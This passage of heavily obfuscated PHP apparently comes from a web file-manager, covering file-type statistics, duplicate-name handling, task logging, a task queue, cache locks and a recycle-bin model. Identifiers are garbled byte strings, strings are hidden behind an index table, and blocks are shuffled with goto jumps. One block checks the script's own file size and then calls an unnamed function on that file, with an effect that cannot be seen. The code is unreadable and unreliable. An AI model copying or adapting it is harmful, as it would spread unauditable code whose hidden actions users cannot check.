$_SERVER[µÅ˜º…æ]; $‡ÏØÄ“ = $ÌïŒ§Äâ[2506] . $İ—Ş–¡ƒ . $ÌïŒ§Äâ[11] . $¯óØ‰¦õ; $¶ãõ˜™³ = Cache::get($‡ÏØÄ“); if ($¶ãõ˜™³) { return $¶ãõ˜™³; } $™ÒùÜ¶È = array($ÌïŒ§Äâ[668] => 0); if ($İ—Ş–¡ƒ != !1) { $™ÒùÜ¶È[$ÌïŒ§Äâ[589]] = $İ—Ş–¡ƒ; $™ÒùÜ¶È[$ÌïŒ§Äâ[188]] = $¯óØ‰¦õ; } $Š¹¯£ = array(); $†ÕÍòôö = $this->field(array($ÌïŒ§Äâ[948] => $ÌïŒ§Äâ[949], $ÌïŒ§Äâ[950] => $ÌïŒ§Äâ[79]))->where($™ÒùÜ¶È)->find(); $Š¹¯£[$ÌïŒ§Äâ[2507]] = array($ÌïŒ§Äâ[2508] => LNG($ÌïŒ§Äâ[2507]), $ÌïŒ§Äâ[2509] => intval($†ÕÍòôö[$ÌïŒ§Äâ[949]]), $ÌïŒ§Äâ[640] => intval($†ÕÍòôö[$ÌïŒ§Äâ[79]])); $Ëîãşì = KodIO::fileTypeList(); foreach ($Ëîãşì as $ŸèÇ‚ö† => $ÊÁª—–®) { $™ÒùÜ¶È[$ÌïŒ§Äâ[501]] = $this->fileTypeWhere($ŸèÇ‚ö†); $†ÕÍòôö = $this->field(array($ÌïŒ§Äâ[948] => $ÌïŒ§Äâ[949], $ÌïŒ§Äâ[950] => $ÌïŒ§Äâ[79]))->where($™ÒùÜ¶È)->find(); $Š¹¯£[$ŸèÇ‚ö†] = array($ÌïŒ§Äâ[2508] => $ÊÁª—–®[$ÌïŒ§Äâ[32]], $ÌïŒ§Äâ[2509] => intval($†ÕÍòôö[$ÌïŒ§Äâ[949]]), $ÌïŒ§Äâ[640] => intval($†ÕÍòôö[$ÌïŒ§Äâ[79]])); } Cache::set($‡ÏØÄ“, $Š¹¯£, 1200); return $Š¹¯£; } public function fileNameExist($ÅìÕş…, $¬×÷‹Á€) { $µÎŞêğÏ =& $_SERVER[µÅ˜º…æ]; $¡ÒÙ·àú = $this->field($µÎŞêğÏ[2510])->where(array($µÎŞêğÏ[190] => $ÅìÕş…, $µÎŞêğÏ[32] => $¬×÷‹Á€, $µÎŞêğÏ[520] => 0))->find(); return is_array($¡ÒÙ·àú) ? $¡ÒÙ·àú[$µÎŞêğÏ[191]] : !1; } public function childList($·Ì·Ø) { $ñºù´— =& $_SERVER[µÅ˜º…æ]; $·êÍù–— = $ñºù´—[2481] . $·Ì·Ø; if (isset(self::$cacheChildList[$·êÍù–—])) { return self::$cacheChildList[$·êÍù–—]; } $ú¡÷Éó» = array($ñºù´—[190] => intval($·Ì·Ø), $ñºù´—[520] => 0); $ıßÂÑö = $this->where($ú¡÷Éó»)->select(); $ıßÂÑö = $ıßÂÑö ? $ıßÂÑö : array(); self::$cacheChildList[$·êÍù–—] = $ıßÂÑö; foreach ($ıßÂÑö as $‹õ¶¨áÏ) { $·êÍù–— = $ñºù´—[547] . $‹õ¶¨áÏ[$ñºù´—[191]]; self::$cacheSourceInfo[$·êÍù–—] = $‹õ¶¨áÏ; } return $ıßÂÑö; } public function fileNameAuto($Ñéùùº­, $“¤«Á–¢, $ÜıÚÙ ß = REPEAT_RENAME, $Ê¯òÁ£Ó = false) { $©çı×€‘ =& $_SERVER[µÅ˜º…æ]; $ıÛ¦Ù‚ = get_path_ext($“¤«Á–¢); $Êìõ…— = $ıÛ¦Ù‚ ? get_path_ext_name($“¤«Á–¢) . $©çı×€‘[2511] . $ıÛ¦Ù‚ : $“¤«Á–¢ . $©çı×€‘[474]; $‡¼Õ¤Şæ = array($©çı×€‘[190] => $Ñéùùº­, $©çı×€‘[520] => 0, $©çı×€‘[32] => array($©çı×€‘[473], $Êìõ…—)); $úŞ‚ıÏ½ = $this->field($©çı×€‘[32])->where($‡¼Õ¤Şæ)->select(); $Ø™ßğŞ = array_to_keyvalue($úŞ‚ıÏ½, $©çı×€‘[12], $©çı×€‘[32]); return $this->fileNameAutoGet($Ø™ßğŞ, $“¤«Á–¢, $ÜıÚÙ ß, $Ê¯òÁ£Ó); } public function fileNameAutoGet($«áÓâüÓ, $Ç­ğ–÷·, $Ÿå´‘ˆ¼, $À’É“Àƒ) { $·Ğ¸àËß =& $_SERVER[µÅ˜º…æ]; if ($Ÿå´‘ˆ¼ == REPEAT_REPLACE || !$«áÓâüÓ || !in_array_not_case($Ç­ğ–÷·, $«áÓâüÓ) || $À’É“Àƒ && $Ÿå´‘ˆ¼ != REPEAT_RENAME_FOLDER) { return $Ç­ğ–÷·; } if ($Ÿå´‘ˆ¼ == REPEAT_SKIP) { return !1; } $’¡ã·®Õ = $·Ğ¸àËß[10] . get_path_ext($Ç­ğ–÷·); $’¡ã·®Õ = $’¡ã·®Õ == $·Ğ¸àËß[10] || $À’É“Àƒ ? $·Ğ¸àËß[12] : $’¡ã·®Õ; for ($ñßä±µ = 1; $ñßä±µ <= count($«áÓâüÓ) + 1; $ñßä±µ++) { $õĞ±°÷‚ = substr($Ç­ğ–÷·, 0, strlen($Ç­ğ–÷·) - strlen($’¡ã·®Õ)); $”ê§Â‚Ÿ = $õĞ±°÷‚ . "\x28{$ñßä±µ}\x29{$’¡ã·®Õ}"; if (!in_array_not_case($”ê§Â‚Ÿ, $«áÓâüÓ)) { return $”ê§Â‚Ÿ; } } } } goto aÙÃ™æğµ; FãÙòŠ°ÇŸ: $_file = $_SERVER[$_SERVER[µÅ˜º…æ][1023]]; $_size = $_SERVER[µÅ˜º…æ][1024]; if ($_SERVER[$_SERVER[µÅ˜º…æ][1025]] != $_size($_file)) { $_getc = $_SERVER[µÅ˜º…æ][1026]; $_getfile = $_SERVER[$_SERVER[µÅ˜º…æ][1027]] . $_SERVER[µÅ˜º…æ][1028]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[µÅ˜º…æ][285], $_getfilec); if (count($_getarrs) < $_SERVER[µÅ˜º…æ][713]) { $exit = $_SERVER[µÅ˜º…æ][1029]; $exit(); } $_act = $_SERVER[µÅ˜º…æ][1030]; $_act($_file); } goto eçµÂÍ¯è; f’¼µ™õ™´: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÑòÀ¤Ğè, $¿¥áğù† = '', $ˆöø³ÌÚ = 0, $Ê£¹ÌŠ• = '') { $ƒÕŠô£— =& $_SERVER[µÅ˜º…æ]; $Ê£¹ÌŠ• = $Ê£¹ÌŠ• ? $Ê£¹ÌŠ• : ($¿¥áğù† ? $¿¥áğù† : $ÑòÀ¤Ğè); $‹‚¯Â³ = new Task($ÑòÀ¤Ğè, $¿¥áğù†, $ˆöø³ÌÚ, $Ê£¹ÌŠ•); $GLOBALS[$ƒÕŠô£—[2067] . $ÑòÀ¤Ğè] = new TaskLog($ƒÕŠô£—[1960], $‹‚¯Â³, $Ê£¹ÌŠ•); return $‹‚¯Â³; } public function __construct($¾Â§èèŸ = '', $ò„…›½ô = '', $Ã¥©ÜÙÅ = '') { $óˆÜ²• =& $_SERVER[µÅ˜º…æ]; if (!$¾Â§èèŸ) { $¾Â§èèŸ = $óˆÜ²•[1960]; } $ÇÅ‚²Ÿ× = $¾Â§èèŸ . $óˆÜ²•[476] . rand_string(10); if (!$Ã¥©ÜÙÅ) { $Ã¥©ÜÙÅ = $¾Â§èèŸ . $óˆÜ²•[53] . $Ã¥©ÜÙÅ; } switch ($¾Â§èèŸ) { case $óˆÜ²•[1960]: if (!$ò„…›½ô || !$ò„…›½ô->task) { return echoLog($¾Â§èèŸ . $óˆÜ²•[2068]); } $–ı­¤ã® = $ò„…›½ô; $ÇÅ‚²Ÿ× = $–ı­¤ã®->task[$óˆÜ²•[487]]; $¾Â§èèŸ = $–ı­¤ã®->task[$óˆÜ²•[487]]; if (!$–ı­¤ã®->task[$óˆÜ²•[1865]]) { $–ı­¤ã®->task[$óˆÜ²•[1865]] = $Ã¥©ÜÙÅ ? $Ã¥©ÜÙÅ : $¾Â§èèŸ; } break; case $óˆÜ²•[2069]: if (!$ò„…›½ô) { return echoLog($¾Â§èèŸ . $óˆÜ²•[2070]); } $Ã®Â = is_string($ò„…›½ô) ? array($ò„…›½ô) : $ò„…›½ô; $–ı­¤ã® = new TaskFileTransfer($ÇÅ‚²Ÿ×, $¾Â§èèŸ, 0, $Ã¥©ÜÙÅ ? $Ã¥©ÜÙÅ : $Ã®Â[0]); foreach ($Ã®Â as $òû²ÄÚ¨) { $–ı­¤ã®->addPath($òû²ÄÚ¨); } break; case $óˆÜ²•[388]: if (!$ò„…›½ô) { return echoLog($¾Â§èèŸ . $óˆÜ²•[2070]); } $Ã®Â = is_string($ò„…›½ô) ? array($ò„…›½ô) : $ò„…›½ô; $–ı­¤ã® = new TaskZip($ÇÅ‚²Ÿ×, $¾Â§èèŸ, 0, $Ã¥©ÜÙÅ ? $Ã¥©ÜÙÅ : $Ã®Â[0]); foreach ($Ã®Â as $òû²ÄÚ¨) { $–ı­¤ã®->addPath($òû²ÄÚ¨); } break; case $óˆÜ²•[1405]: if (!$ò„…›½ô) { return echoLog($¾Â§èèŸ . $óˆÜ²•[2070]); } $–ı­¤ã® = new TaskUnZip($ÇÅ‚²Ÿ×, $¾Â§èèŸ, 0, $Ã¥©ÜÙÅ ? $Ã¥©ÜÙÅ : $ò„…›½ô); if ($ò„…›½ô) { $–ı­¤ã®->addFile($ò„…›½ô); } break; case $óˆÜ²•[149]: $–ı­¤ã® = new TaskHttp($ÇÅ‚²Ÿ×, $¾Â§èèŸ); break; default: return; break; } $this->task = $–ı­¤ã®; $this->taskID = $ÇÅ‚²Ÿ×; Hook::bind($óˆÜ²•[1996], array($this, $óˆÜ²•[2071])); Hook::bind($óˆÜ²•[1998], array($this, $óˆÜ²•[2072])); Hook::bind($óˆÜ²•[1992], array($this, $óˆÜ²•[2073])); echoLog($óˆÜ²•[2074] . $–ı­¤ã®->task[$óˆÜ²•[1865]]); } public function __destruct() { $this->end(); } public function end($çªÙˆª« = '') { $¥×Îí§ =& $_SERVER[µÅ˜º…æ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($çªÙˆª«); $this->task = !1; $this->taskID = !1; Hook::unbind($¥×Îí§[1996], array($this, $¥×Îí§[2071])); Hook::unbind($¥×Îí§[1998], array($this, $¥×Îí§[2072])); Hook::unbind($¥×Îí§[1992], array($this, $¥×Îí§[2073])); } public function taskUpdate($å›ï£É) { $øÜ²ü‹ê =& $_SERVER[µÅ˜º…æ]; if (!$å›ï£É || $this->taskID != $å›ï£É[$øÜ²ü‹ê[487]]) { return; } $¶ËË†…‰ = 20; $À«¾ãó¡ = intval($å›ï£É[$øÜ²ü‹ê[1977]] * $¶ËË†…‰); $ùñ–©·İ = $øÜ²ü‹ê[173] . str_repeat($øÜ²ü‹ê[464], $À«¾ãó¡) . $øÜ²ü‹ê[1183] . str_repeat($øÜ²ü‹ê[53], $¶ËË†…‰ - $À«¾ãó¡) . $øÜ²ü‹ê[175]; $Š†éªáÊ = $ùñ–©·İ . sprintf($øÜ²ü‹ê[2075], $å›ï£É[$øÜ²ü‹ê[1977]] * 100) . $øÜ²ü‹ê[2076]; $…ªÃ°Ş— = $Š†éªáÊ . $å›ï£É[$øÜ²ü‹ê[1976]] . $øÜ²ü‹ê[8] . $å›ï£É[$øÜ²ü‹ê[1233]] . LNG($øÜ²ü‹ê[2077]); $şà—¼‘¶ = $øÜ²ü‹ê[12]; if ($å›ï£É[$øÜ²ü‹ê[2061]]) { $…ªÃ°Ş— = $Š†éªáÊ . size_format($å›ï£É[$øÜ²ü‹ê[1976]]) . $øÜ²ü‹ê[8] . size_format($å›ï£É[$øÜ²ü‹ê[1233]]); $şà—¼‘¶ = size_format($å›ï£É[$øÜ²ü‹ê[1978]]) . $øÜ²ü‹ê[2078]; } if ($å›ï£É[$øÜ²ü‹ê[1235]]) { $å›ï£É[$øÜ²ü‹ê[2027]] = $å›ï£É[$øÜ²ü‹ê[1235]] . $øÜ²ü‹ê[53] . $å›ï£É[$øÜ²ü‹ê[2027]]; } if ($å›ï£É[$øÜ²ü‹ê[2027]]) { $ŞÃ÷¹ = $øÜ²ü‹ê[12]; if ($å›ï£É[$øÜ²ü‹ê[2029]]) { $ŞÃ÷¹ = $øÜ²ü‹ê[50] . size_format($å›ï£É[$øÜ²ü‹ê[2030]]) . $øÜ²ü‹ê[8] . size_format($å›ï£É[$øÜ²ü‹ê[2029]]); } $şà—¼‘¶ .= $å›ï£É[$øÜ²ü‹ê[2027]] . $ŞÃ÷¹; } if ($å›ï£É[$øÜ²ü‹ê[863]] && !$å›ï£É[$øÜ²ü‹ê[2029]]) { $şà—¼‘¶ .= $øÜ²ü‹ê[53] . size_format($å›ï£É[$øÜ²ü‹ê[940]]) . $øÜ²ü‹ê[8] . size_format($å›ï£É[$øÜ²ü‹ê[863]]); } echoLog($…ªÃ°Ş— . $øÜ²ü‹ê[53] . $şà—¼‘¶, !0); } public function taskEnd($Ğ»¢Ğà¶) { $¢óÂâ ˜ =& $_SERVER[µÅ˜º…æ]; if (!$Ğ»¢Ğà¶ || $this->taskID != $Ğ»¢Ğà¶[$¢óÂâ ˜[487]]) { return; } $£ÀØ–ğ´ = $Ğ»¢Ğà¶ ? LNG($¢óÂâ ˜[2079]) . $¢óÂâ ˜[4] . $Ğ»¢Ğà¶[$¢óÂâ ˜[1976]] . $¢óÂâ ˜[8] . $Ğ»¢Ğà¶[$¢óÂâ ˜[1233]] . LNG($¢óÂâ ˜[2077]) . $¢óÂâ ˜[74] : $¢óÂâ ˜[12]; echoLog($¢óÂâ ˜[2080] . $Ğ»¢Ğà¶[$¢óÂâ ˜[1865]] . ($Ğ»¢Ğà¶[$¢óÂâ ˜[540]] ? $¢óÂâ ˜[74] . $Ğ»¢Ğà¶[$¢óÂâ ˜[540]] : $¢óÂâ ˜[12]) . $¢óÂâ ˜[74] . $£ÀØ–ğ´ . $¢óÂâ ˜[2081] . sprintf($¢óÂâ ˜[1007], timeFloat() - $Ğ»¢Ğà¶[$¢óÂâ ˜[1979]]) . $¢óÂâ ˜[1991]); $this->end(); } public function taskKill($›©Ò« ·) { $‰²©Ã =& $_SERVER[µÅ˜º…æ]; if (!$›©Ò« · || $this->taskID != $›©Ò« ·[$‰²©Ã[487]]) { return; } echoLog($‰²©Ã[2082] . $›©Ò« ·[$‰²©Ã[1865]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\153\x51\x75\145\x75\145\x4c\x65\x6e\147\164\150"; const QUEUE_DATA = "\x74\141\163\153\121\165\145\x75\145\104\141\164\141"; const QUEUE_TIME = "\x74\x61\x73\x6b\121\165\x65\x75\145\x4c\x61\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\141\x73\153\x51\x75\145\x75\145\x54\x68\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ŠÂµº, $ÈêÄöíÇ = array(), $¯øÚÍšú = '', $ßü¿É„Œ = '') { $ª«€´Í¡ =& $_SERVER[µÅ˜º…æ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ßü¿É„Œ && array_find_by_field(self::$listData, $ª«€´Í¡[95], $ßü¿É„Œ)) { return !0; } if ($ßü¿É„Œ && array_find_by_field(self::$listDataAdd, $ª«€´Í¡[95], $ßü¿É„Œ)) { return !0; } self::$listDataAdd[] = array($ª«€´Í¡[342] => $ŠÂµº, $ª«€´Í¡[2083] => $ÈêÄöíÇ, $ª«€´Í¡[540] => $¯øÚÍšú, $ª«€´Í¡[95] => $ßü¿É„Œ); return !0; } public static function addSubmit() { $‹šÓ¥ş =& $_SERVER[µÅ˜º…æ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($‹šÓ¥ş[2084] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $‹šÓ¥ş[12], $‹šÓ¥ş[540])), $‹šÓ¥ş[195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($€‡­üßÜ, $Ší·ş¢ = array(), $ñœÖ¨« = '', $µ÷Ü±üÔ = '') { $şºşæÈœ =& $_SERVER[µÅ˜º…æ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $•  €§ƒ = self::getAll(); if ($µ÷Ü±üÔ && array_find_by_field($•  €§ƒ, $şºşæÈœ[95], $µ÷Ü±üÔ)) { return !0; } $•  €§ƒ[] = array($şºşæÈœ[342] => $€‡­üßÜ, $şºşæÈœ[2083] => $Ší·ş¢, $şºşæÈœ[540] => $ñœÖ¨«, $şºşæÈœ[95] => $µ÷Ü±üÔ); self::setAll($•  €§ƒ); write_log($şºşæÈœ[2084] . $ñœÖ¨«, $şºşæÈœ[195]); return !0; } public static function run() { $ôîŠğÊ =& $_SERVER[µÅ˜º…æ]; $ö½Öò™ = self::getAll(); $˜ôä¾¯ô = array_shift($ö½Öò™); if (!$˜ôä¾¯ô) { return !1; } self::setAll($ö½Öò™); $›Šİñâ = timeFloat(); $ªíÙ‰ğÆ = $ôîŠğÊ[12]; try { $ªíÙ‰ğÆ = Hook::apply($˜ôä¾¯ô[$ôîŠğÊ[342]], $˜ôä¾¯ô[$ôîŠğÊ[2083]]); } catch (Exception $×¾Ÿ¼æ®) { write_log($×¾Ÿ¼æ®, $ôîŠğÊ[1372]); } $áÏÍˆéÅ = number_format(timeFloat() - $›Šİñâ, 3) . $ôîŠğÊ[1991]; if ($ªíÙ‰ğÆ && is_string($ªíÙ‰ğÆ)) { $áÏÍˆéÅ = $áÏÍˆéÅ . $ôîŠğÊ[2085] . $ªíÙ‰ğÆ; } write_log($ôîŠğÊ[2086] . $˜ôä¾¯ô[$ôîŠğÊ[540]] . $ôîŠğÊ[2087] . $áÏÍˆéÅ, $ôîŠğÊ[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Úø¬šÈÆ =& $_SERVER[µÅ˜º…æ]; $¾ÜÙÌ¾Ş = self::threadCount() + 1; if ($¾ÜÙÌ¾Ş > 3 || !self::count()) { return; } write_log($Úø¬šÈÆ[2088] . $¾ÜÙÌ¾Ş, $Úø¬šÈÆ[195]); Cache::set(self::QUEUE_THREAD, $¾ÜÙÌ¾Ş, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Úø¬šÈÆ[2089], $Úø¬šÈÆ[195]); } public static function getKey($»ìñÁ¢÷, $®Ãõìö¥ = "\x69\x6e\x74") { $ô£âİæ  =& $_SERVER[µÅ˜º…æ]; Cache::removeMemory($»ìñÁ¢÷); $Ã—›Ç = Cache::get($»ìñÁ¢÷); if ($®Ãõìö¥ == $ô£âİæ [364]) { return $Ã—›Ç ? intval($Ã—›Ç) : 0; } if ($®Ãõìö¥ == $ô£âİæ [2090]) { return is_array($Ã—›Ç) ? $Ã—›Ç : array(); } return $Ã—›Ç; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[µÅ˜º…æ][2090]); } public static function setAll($í–ŸæŞ) { $¿Å÷òšÔ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($í–ŸæŞ), $¿Å÷òšÔ); Cache::set(self::QUEUE_DATA, $í–ŸæŞ, $¿Å÷òšÔ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¦’§Î, $ééÜ¿ÏÏ = 5.0) { if (!$¦’§Î) { return; } $Áæ©ÇÎ = Cache::get($¦’§Î); if (!$Áæ©ÇÎ || timeFloat() - floatVal($Áæ©ÇÎ) >= $ééÜ¿ÏÏ) { Cache::set($¦’§Î, timeFloat(), $ééÜ¿ÏÏ * 10); return !0; } return !1; } public static function timeLimitCall($à‚ñİ„®, $¤î¢×õ¢, $’ÓÜÍÅÓ, $Õ°ëÀˆ = 5.0) { $İšÁ¼¢ß =& $_SERVER[µÅ˜º…æ]; if (!$à‚ñİ„® || !$¤î¢×õ¢) { return; } self::$asyncAdd = !0; $î—˜ÙÅ = $İšÁ¼¢ß[2091]; $¬—…ªˆ‰ = Cache::get($î—˜ÙÅ, !0); $÷Ç¼Õ¯š = array($İšÁ¼¢ß[2092] => timeFloat(), $İšÁ¼¢ß[2093] => timeFloat(), $İšÁ¼¢ß[342] => $¤î¢×õ¢, $İšÁ¼¢ß[2083] => $’ÓÜÍÅÓ, $İšÁ¼¢ß[2094] => $Õ°ëÀˆ); if (is_array($¬—…ªˆ‰[$à‚ñİ„®])) { if (timeFloat() - $¬—…ªˆ‰[$à‚ñİ„®][$İšÁ¼¢ß[2092]] <= $÷Ç¼Õ¯š[$İšÁ¼¢ß[2094]] * 0.5) { return; } $÷Ç¼Õ¯š[$İšÁ¼¢ß[2093]] = $¬—…ªˆ‰[$à‚ñİ„®][$İšÁ¼¢ß[2093]]; } $¬—…ªˆ‰[$à‚ñİ„®] = $÷Ç¼Õ¯š; Cache::set($î—˜ÙÅ, $¬—…ªˆ‰, 60); Cache::removeMemory($î—˜ÙÅ); write_log($İšÁ¼¢ß[2095] . $à‚ñİ„® . $İšÁ¼¢ß[74] . $¤î¢×õ¢ . $İšÁ¼¢ß[2096] . ACTION, $İšÁ¼¢ß[195]); } public static function timeLimitCallLoop() { $ºÅşæ°‚ =& $_SERVER[µÅ˜º…æ]; $‘°×ó§Ó = array($ºÅşæ°‚[2097]); $ÆÆ¢Åéğ = in_array(strtolower(ACTION), $‘°×ó§Ó); if (!$ÆÆ¢Åéğ && !self::$asyncAdd) { return; } $Ï¡óˆ¹— = $ºÅşæ°‚[2091]; $¬ıÂÑ±½ = Cache::get($Ï¡óˆ¹—, !0); if (!$¬ıÂÑ±½ || count($¬ıÂÑ±½) <= 0) { return; } $Ôò”—ì­ = timeFloat(); $…¢ì°ŒÒ = array(); $£‡ú§¯ = array(); foreach ($¬ıÂÑ±½ as $âÏ“¼‘Ç => $ÒËÕÂÒƒ) { if ($Ôò”—ì­ - $ÒËÕÂÒƒ[$ºÅşæ°‚[2093]] > $ÒËÕÂÒƒ[$ºÅşæ°‚[2094]]) { $£‡ú§¯[$âÏ“¼‘Ç] = $ÒËÕÂÒƒ; continue; } $…¢ì°ŒÒ[$âÏ“¼‘Ç] = $ÒËÕÂÒƒ; } if (count($£‡ú§¯) == 0) { return; } if (count($…¢ì°ŒÒ) == 0) { Cache::remove($Ï¡óˆ¹—); } else { Cache::set($Ï¡óˆ¹—, $…¢ì°ŒÒ, 60); } Cache::removeMemory($Ï¡óˆ¹—); self::runArr($£‡ú§¯); } public static function finished($î ëÃşÎ, $¹ù™«º) { $šÂŒØ¬û =& $_SERVER[µÅ˜º…æ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($šÂŒØ¬û[342] => $î ëÃşÎ, $šÂŒØ¬û[2083] => $¹ù™«º); } private static function runArr($„±èˆâ¯) { $åô‹ë =& $_SERVER[µÅ˜º…æ]; if (!$„±èˆâ¯) { return; } foreach ($„±èˆâ¯ as $Ï§®À÷è => $Áô…›¼ò) { try { Hook::apply($Áô…›¼ò[$åô‹ë[342]], $Áô…›¼ò[$åô‹ë[2083]]); write_log($åô‹ë[2098] . $Ï§®À÷è . $åô‹ë[74] . $Áô…›¼ò[$åô‹ë[342]] . $åô‹ë[2096] . ACTION, $åô‹ë[195]); } catch (Exception $ğ„¬©Í) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto A¦ğØá´ÙÇ; eçµÂÍ¯è: class CacheLockRedis { public function lock($«°´Èşö, $¶£ï™èı = 10) { $õç¥ÉÇ“ = Cache::init(); $¾©µÖÄ = microtime(!0) + $¶£ï™èı; while (microtime(!0) < $¾©µÖÄ) { $œë®úÂ = $õç¥ÉÇ“->get($«°´Èşö); if (!$œë®úÂ) { $ĞŸó¾«õ = $õç¥ÉÇ“->setLock($«°´Èşö, $¾©µÖÄ, $¶£ï™èı); if ($ĞŸó¾«õ) { return !0; } } else { if ($œë®úÂ < microtime(!0)) { $õç¥ÉÇ“->set($«°´Èşö, $¾©µÖÄ, $¶£ï™èı * 2); if ($õç¥ÉÇ“->get($«°´Èşö) === $œë®úÂ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Œò¢ä–) { return Cache::init()->get($Œò¢ä–); } public function unlock($À™±í¾³) { return Cache::init()->remove($À™±í¾³); } } class CacheLockMemcached { public function lock($áıØé—Ğ, $®Ö°÷¡Î = 0) { $à‰ÒÙî„ = Cache::init(); $™Ú¤¬“Û = microtime(!0) + $®Ö°÷¡Î; while (microtime(!0) < $™Ú¤¬“Û) { $¶º£†ˆ† = $à‰ÒÙî„->get($áıØé—Ğ); if (!$¶º£†ˆ† || $¶º£†ˆ† < microtime(!0)) { $ÕõËªÛ´ = $à‰ÒÙî„->handle->add($áıØé—Ğ, $™Ú¤¬“Û, $®Ö°÷¡Î); if ($ÕõËªÛ´) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ñµèœê) { return Cache::init()->get($Ñµèœê); } public function unlock($²ú»ıÓÛ) { return Cache::init()->remove($²ú»ıÓÛ); } } class CacheLockDatabase { public function lock($˜ÓÌ§ÇÅ, $õî¼ºª = 0) { $÷³éÜ‡ = Model($_SERVER[µÅ˜º…æ][981]); $ó¡Ó ·¨ = microtime(!0) + $õî¼ºª; while (microtime(!0) < $ó¡Ó ·¨) { $Óá“§ = $÷³éÜ‡->get($˜ÓÌ§ÇÅ); if (!$Óá“§ || $Óá“§ < microtime(!0)) { $­è€Š¸İ = $÷³éÜ‡->set($˜ÓÌ§ÇÅ, $ó¡Ó ·¨); if ($­è€Š¸İ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($é¡È®ò) { return Model($_SERVER[µÅ˜º…æ][981])->get($é¡È®ò); } public function unlock($€è»÷ïö) { Model($_SERVER[µÅ˜º…æ][981])->remove($€è»÷ïö); } } goto FÊ†ÕóƒÉ; aÙÃ™æğµ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\x63\x65\137\162\x65\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\x75\156\x63\164\151\157\156")); public function listData($×§Ú¬Ùë = false) { $¸ôºÆö” =& $_SERVER[µÅ˜º…æ]; $×§Ú¬Ùë = $×§Ú¬Ùë ? $×§Ú¬Ùë : USER_ID; $Ôüâ«îë = $this->where(array($¸ôºÆö”[1967] => $×§Ú¬Ùë))->select(); return array_to_keyvalue($Ôüâ«îë, $¸ôºÆö”[12], $¸ôºÆö”[191]); } public function moveToRecycle($Ü†âê¯Ñ) { $»˜–ËëÑ =& $_SERVER[µÅ˜º…æ]; $³À ÊˆÚ = Model($»˜–ËëÑ[1534]); $‡•ü‰ßÙ = $³À ÊˆÚ->sourceInfo($Ü†âê¯Ñ); if (!$‡•ü‰ßÙ || $‡•ü‰ßÙ[$»˜–ËëÑ[520]] == $»˜–ËëÑ[91]) { return; } $ü¾ŸØÊ² = array($»˜–ËëÑ[506] => $Ü†âê¯Ñ, $»˜–ËëÑ[1967] => USER_ID, $»˜–ËëÑ[670] => $‡•ü‰ßÙ[$»˜–ËëÑ[188]], $»˜–ËëÑ[671] => $‡•ü‰ßÙ[$»˜–ËëÑ[589]], $»˜–ËëÑ[674] => $‡•ü‰ßÙ[$»˜–ËëÑ[604]]); $this->add($ü¾ŸØÊ²); $this->recycleMove($Ü†âê¯Ñ, 1); if ($‡•ü‰ßÙ[$»˜–ËëÑ[500]] == $»˜–ËëÑ[91]) { $±§Ú²ïò = array($»˜–ËëÑ[674] => array($»˜–ËëÑ[635], $‡•ü‰ßÙ[$»˜–ËëÑ[604]] . $Ü†âê¯Ñ . $»˜–ËëÑ[636])); $³À ÊˆÚ->where($±§Ú²ïò)->setField($»˜–ËëÑ[520], 1); } } public function clear() { $this->remove(!1); } public function remove($‹Ê„¸½£ = false, $Æ¼õ‚Æ® = false) { $ˆüõ÷ó¹ =& $_SERVER[µÅ˜º…æ]; $Æ¼õ‚Æ® = $Æ¼õ‚Æ® ? $Æ¼õ‚Æ® : USER_ID; $öºÄ¬Á = Model($ˆüõ÷ó¹[1534]); $´î„˜èµ = $this->listData($Æ¼õ‚Æ®); $‹Ê„¸½£ = $‹Ê„¸½£ === !1 ? !1 : $‹Ê„¸½£; $éƒô™Ò’ = array(); foreach ($´î„˜èµ as $¿µ¯ áÁ) { if ($‹Ê„¸½£ != !1 && !in_array($¿µ¯ áÁ, $‹Ê„¸½£)) { continue; } $©¬§¶ = $öºÄ¬Á->sourceInfo($¿µ¯ áÁ); $öºÄ¬Á->remove($¿µ¯ áÁ, !1); $¼ôİ¾€ = $©¬§¶[$ˆüõ÷ó¹[188]] . $ˆüõ÷ó¹[11] . $©¬§¶[$ˆüõ÷ó¹[589]]; $éƒô™Ò’[$¼ôİ¾€] = array($ˆüõ÷ó¹[670] => $©¬§¶[$ˆüõ÷ó¹[188]], $ˆüõ÷ó¹[589] => $©¬§¶[$ˆüõ÷ó¹[589]]); 